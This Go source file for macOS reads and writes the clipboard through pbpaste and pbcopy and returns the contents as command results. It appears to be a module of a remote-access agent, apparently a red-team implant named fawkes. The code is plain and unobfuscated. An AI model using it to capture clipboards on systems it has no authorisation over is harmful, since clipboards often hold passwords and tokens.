//go:build darwin

package commands

import (
	"fmt"
	"os/exec"
	"strings"

	"fawkes/pkg/structs"
)

func readClipboard() structs.CommandResult {
	out, err := exec.Command("pbpaste").Output()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to read clipboard: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	text := string(out)
	if text == "" {
		return structs.CommandResult{
			Output:    "Clipboard is empty",
			Status:    "success",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Clipboard contents (%d chars):\n%s", len(text), text),
		Status:    "success",
		Completed: true,
	}
}

func writeClipboard(text string) structs.CommandResult {
	cmd := exec.Command("pbcopy")
	cmd.Stdin = strings.NewReader(text)
	if err := cmd.Run(); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to write to clipboard: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    fmt.Sprintf("Successfully wrote %d characters to clipboard", len(text)),
		Status:    "success",
		Completed: true,
	}
}

func clipReadText() string {
	out, err := exec.Command("pbpaste").Output()
	if err != nil {
		return ""
	}
	return string(out)
}
